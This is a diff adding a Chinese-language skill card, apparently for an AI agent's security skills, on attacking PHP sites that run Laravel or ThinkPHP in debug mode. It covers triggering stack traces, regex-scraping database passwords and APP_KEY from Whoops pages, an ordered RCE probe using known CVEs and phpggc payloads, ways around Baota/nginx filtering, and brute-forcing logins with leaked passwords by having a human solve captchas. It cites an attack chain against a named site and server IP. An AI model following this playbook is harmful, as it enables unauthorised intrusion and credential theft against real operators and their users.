+- 比对: raw.githubusercontent.com/laravel/framework/<tag>/src/Illuminate/Routing/UrlGenerator.php
+- 辅助: fideloper/pro
+
+…（截断，全文见来源卡）
+
+### php-debug-mode-exploitation
+
+来源：`/root/.hermes/skills/security/php-debug-mode-exploitation/SKILL.md`
+
+# PHP 框架 Debug 模式利用（Laravel / ThinkPHP）
+
+PHP 站（尤其宝塔部署）开着 debug 时，异常页 = 配置金矿 + 路由 oracle + RCE 入口。典型触发链：找任意能抛异常的端点（未认证中间件 500、方法不符 405、SQL 报错、路由不存在）。
+
+实测站（Laravel 行号锁版本 / Whoops 抽 .env）细节走 `php-framework-debug-leak-pentest`，本卡管 Ignition/Whoops 通用面。  
+Werkzeug / Django DEBUG / FastAPI `/openapi.json` **不走本卡**，走 `core-web-vuln-kit`（`core_web_surface_probe.py` 指纹）+ `ssti-exploit` 算 PIN。
+
+## 1. 异常页触发点（无认证）
+
+| 触发方式 | Laravel | ThinkPHP 6 |
+|---|---|---|
+| 未认证 API（auth 中间件 + login 路由缺失） | `/api/user` → 500 `Route [login] not defined` + 全堆栈 | — |
+| 方法不符（GET-only 路由 POST） | 405 `MethodNotAllowedHttpException` + 堆栈 | — |
+| 任意 POST 到 catch-all 短链路由 | 405（catch-all 只注册 GET） | — |
+| SQL 报错 | — | `/api/index` → 400 `SQLSTATE...` + 完整 trace + **数据库名/表名** |
+| 404 页 | — | ThinkPHP 404 页带版本横幅（`ThinkPHP V6.1.1`） |
+
+## 2. Whoops 环境变量提取（核心）
+
+Laravel debug 异常页 HTML 的 Environment Variables 面板含 **$_ENV 实际值**（不只键名）：
+- `DB_PASSWORD`、`APP_KEY`、`DB_HOST/DATABASE/USERNAME`、`APP_URL`、`SERVER_ADDR/SERVER_NAME`（内网 IP）、`DOCUMENT_ROOT`、`SESSION_DRIVER`、`MAIL_*`
+- 提取正则（值在 sf-dump span 里）：
+ `<td>([A-Za-z0-9_]{2,60})</td>\s*<td><pre[^>]*>(.*?)</pre>` 再取 `class="sf-dump-str"[^>]*>([^<]*)</span>`
+- 页面很大（20-50 万字符）：用 page_eval 分块读 outerHTML（每块 15KB）落盘再正则。
+- **APP_KEY 是 Laravel 加密基础**：可解密 session/cookie；CVE-2018-15133（unserialize RCE）仅 Laravel 5.5-5.6.30，5.6.30 后 EncryptCookies 不再反序列化——先版本指纹再决定是否用 phpggc。
+
+## 3. 路由枚举 oracle 与陷阱
+
+- **POST 到任意路径 → 405 Whoops = 路由存在**——但**带 catch-all 短链/单路由的应用全部假阳性**（catch-all 匹配一切 GET，POST 全 405）。必须 GET 再测：真实路由返回 HTML/JSON，catch-all 无效码返回 "0"/404。
+- 版本指纹：异常页堆栈行号（RouteCollection.php methodNotAllowed ~242-255 → 5.8/6.x）、vendor 路径、`fideloper/proxy`（TrustProxies，5.x-6.x 标志）。
+- composer.json/vendor/installed.json/.env 通常被 nginx 404 挡；`/index.php/xxx` PATH_INFO 可控可确认但注入会被 nginx 特殊字符拦截（见下）。
+
+## 4. RCE 探测顺序
+
+1. **CVE-2019-11043（PHP-FPM）**：PATH_INFO 可控 + nginx fastcgi_split_path_info 时试；快速判定 = `?a=` + N×`%0a`（N=1..2000）全 200 OK 则 PHP≥7.4 已修复，放弃。
+2. **CVE-2018-15133（Laravel APP_KEY）**：版本 5.5-5.6.30 才适用；phpggc `Laravel/RCE1-9` 按版本选 gadget；payload 放 X-XSRF-TOKEN。
+3. **Ignition RCE（CVE-2021-3129）**：`/_ignition/*` 常被 nginx 单独 deny（404）——先确认端点可达再谈 gadget。
+
+## 5. nginx/宝塔部署特征
+
+- **nginx 路径层拦截**：路径含 `'` `"` `%00` `..` 等特殊字符直接 404/400（请求到不了 PHP）——**路径参数 SQL 注入被挡死**，改走 query/body 或放弃。
+- 宝塔面板 8888：domain.conf 域名限制（Host 头校验，IP/localhost/已知子域全拒）+ 未备案域名 8888 显示 ICP 拦截页。
+- 宝塔 MySQL 3306 对外开放但**用户绑定 localhost**（远程 Access denied）——远程爆破无意义，突破口是应用 RCE 后本地连库。
+- **登录接口 error() 分支崩溃 ≠ 接口全坏**（如 TP6 `Undefined property: think\facade\App::$config`）：失败响应 500 崩溃页、**成功路径可能正常返回 JSON**——需要正确凭据+验证码才能区分，别误判为"登录不可用"。
+
+## 6. 验证码处理
+
+- 图形验证码（200x62 干扰线）：tesseract 多预处理（二值化/反色/中值）仍失败就 **MEDIA 发图给用户人工识别**（用户可协助），配合泄露密码组合试登录；验证码需带 session cookie 获取。
+- 登录接口崩溃时响应无法区分"验证码错/密码错"——每尝试都要新验证码。
+
+## References
+
+- `references/8gtg-embracedream-chain.md` — 实战链路：8G 盘 → 8gtg.vip(Laravel .env 泄露) → 源站 47.107.94.222(阿里云) → CRMEB/TP6.1.1 dysjkcom 库、失败路径清单。
+
+## 真源
+
+- 手法：`docs/playbooks/打网站手法.md`
+- 工具：`python3 tools/ops/core_web_surface_probe.py --help`
